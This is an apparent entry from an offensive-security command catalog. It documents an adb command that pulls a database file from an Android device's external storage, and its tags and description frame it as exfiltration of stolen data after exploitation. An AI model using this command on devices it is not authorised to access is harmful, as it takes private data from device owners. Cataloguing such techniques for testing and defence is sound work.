---
data: adb pull /sdcard/Download/private_file.db ./stolen_file.db
tags:
  - exfil
  - android
  - file
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.035Z'
id: f5f26cae-0e56-4133-99b3-6be6ad5ee1a8
verified: false
validated: true
submitted: true
---
# adb-pull-public-file

## Command

```bash
adb pull /sdcard/Download/private_file.db ./stolen_file.db
```

## Description

Pulls a file from public external storage on Android device to host machine, used post-exploit to retrieve stolen data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/sdcard/Download/private_file.db` | Source path on device | Yes |
| `./stolen_file.db` | Destination on host | Yes |

## Examples

### Basic Usage

```bash
adb pull /sdcard/Download/file.db ./local_file.db
```

### Advanced Usage

```bash
adb pull "$DEVICE_PATH" "$HOST_PATH"
```

## Expected Output

/private_file.db: 1 file pulled. 0.5 MB/s (1024 bytes in 0.001s)

## Related

- [[Related Procedure: Retrieve Copied File from Public Directory]]
